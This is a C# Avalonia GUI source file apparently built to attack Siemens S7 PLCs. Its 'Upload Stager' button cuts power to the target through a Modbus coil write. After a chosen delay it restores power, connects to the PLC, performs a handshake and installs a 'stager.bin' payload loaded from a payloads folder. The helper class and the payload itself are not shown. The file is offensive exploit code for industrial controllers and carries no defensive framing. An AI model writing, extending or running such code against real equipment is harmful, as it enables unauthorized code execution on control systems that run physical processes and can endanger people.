using Avalonia.Controls;
using Avalonia.Threading;
using System;
using System.IO;
using System.Net.Sockets;
using System.Threading.Tasks;
using Modbus.Device;

namespace S7_Csharp_Utility
{
    public partial class MainWindow : Window
    {
        private readonly PlcCommunicator _plc;

        // Control references
        private TextBox PlcHostTextBox;
        private TextBox PlcPortTextBox;
        private TextBox ModbusHostTextBox;
        private TextBox ModbusPortTextBox;
        private TextBox ModbusCoilTextBox;
        private NumericUpDown DelayNumericUpDown;
        private TextBlock LogTextBlock;
        private Button PowerOnButton;
        private Button PowerOffButton;
        private Button UploadStagerButton;

        public MainWindow()
        {
            InitializeComponent();

            // Manually find controls by name
            PlcHostTextBox = this.FindControl<TextBox>("PlcHostTextBox");
            PlcPortTextBox = this.FindControl<TextBox>("PlcPortTextBox");
            ModbusHostTextBox = this.FindControl<TextBox>("ModbusHostTextBox");
            ModbusPortTextBox = this.FindControl<TextBox>("ModbusPortTextBox");
            ModbusCoilTextBox = this.FindControl<TextBox>("ModbusCoilTextBox");
            DelayNumericUpDown = this.FindControl<NumericUpDown>("DelayNumericUpDown");
            LogTextBlock = this.FindControl<TextBlock>("LogTextBlock");
            PowerOnButton = this.FindControl<Button>("PowerOnButton");
            PowerOffButton = this.FindControl<Button>("PowerOffButton");
            UploadStagerButton = this.FindControl<Button>("UploadStagerButton");

            _plc = new PlcCommunicator(Log);

            // Wire up event handlers
            PowerOnButton.Click += async (s, e) => await SetPower(true);
            PowerOffButton.Click += async (s, e) => await SetPower(false);
            UploadStagerButton.Click += UploadStagerButton_Click;
        }

        private void Log(string message)
        {
            // Use Avalonia's Dispatcher to update UI from any thread
            Dispatcher.UIThread.Post(() =>
            {
                var timestamp = DateTime.Now.ToString("HH:mm:ss");
                LogTextBlock.Text += $"[{timestamp}] {message}{Environment.NewLine}";
                // Auto-scroll logic would go here if we had a ScrollViewer name
            });
        }

        private async Task SetPower(bool on)
        {
            string state = on ? "ON" : "OFF";
            Log($"Attempting to turn power {state}...");

            try
            {
                string host = ModbusHostTextBox.Text;
                if (!int.TryParse(ModbusPortTextBox.Text, out int port))
                {
                    Log("Error: Invalid Modbus port.");
                    return;
                }
                if (!ushort.TryParse(ModbusCoilTextBox.Text, out ushort coilAddress))
                {
                    Log("Error: Invalid Modbus coil address.");
                    return;
                }

                using (var client = new TcpClient())
                {
                    await client.ConnectAsync(host, port);
                    if (!client.Connected)
                    {
                        Log($"Error: Could not connect to Modbus host {host}:{port}.");
                        return;
                    }

                    var factory = new Modbus.Utility.ModbusFactory();
                    IModbusMaster master = factory.CreateMaster(client);

                    ushort zeroBasedCoilAddress = (ushort)(coilAddress - 1);

                    await master.WriteSingleCoilAsync(0, zeroBasedCoilAddress, on);
                    Log($"Successfully turned power {state}.");
                }
            }
            catch (Exception ex)
            {
                Log($"Error controlling power: {ex.Message}");
            }
        }

        private async void UploadStagerButton_Click(object sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            SetControlsEnabled(false);
            try
            {
                await SetPower(false);
                int delaySeconds = (int)(DelayNumericUpDown.Value ?? 1);
                Log($"Waiting for {delaySeconds} seconds before powering on...");
                await Task.Delay(delaySeconds * 1000);
                await SetPower(true);

                await Task.Delay(50);

                await RunFullSequenceAsync();
            }
            catch (Exception ex)
            {
                Log($"An error occurred during the sequence: {ex.Message}");
            }
            finally
            {
                if (_plc.IsConnected)
                {
                    _plc.Disconnect();
                }
                SetControlsEnabled(true);
            }
        }

        private async Task RunFullSequenceAsync()
        {
            if (!int.TryParse(PlcPortTextBox.Text, out int port))
            {
                Log("Error: Invalid PLC port.");
                return;
            }
            await _plc.ConnectAsync(PlcHostTextBox.Text, port);
            if (!_plc.IsConnected) return;

            if (await _plc.PerformHandshakeAsync())
            {
                await _plc.GetVersion();

                string stagerPath = Path.Combine(AppContext.BaseDirectory, "payloads", "stager", "stager.bin");
                if (!File.Exists(stagerPath))
                {
                    Log($"Error: Stager payload not found at {stagerPath}");
                    return;
                }
                byte[] stagerPayload = await File.ReadAllBytesAsync(stagerPath);
                Log($"Loaded stager payload ({stagerPayload.Length} bytes).");

                await _plc.InstallStager(stagerPayload);
            }
        }

        private void SetControlsEnabled(bool enabled)
        {
            // Disable all interactive controls
            PlcHostTextBox.IsEnabled = enabled;
            PlcPortTextBox.IsEnabled = enabled;
            ModbusHostTextBox.IsEnabled = enabled;
            ModbusPortTextBox.IsEnabled = enabled;
            ModbusCoilTextBox.IsEnabled = enabled;
            DelayNumericUpDown.IsEnabled = enabled;
            PowerOnButton.IsEnabled = enabled;
            PowerOffButton.IsEnabled = enabled;
            UploadStagerButton.IsEnabled = enabled;
        }
    }
}
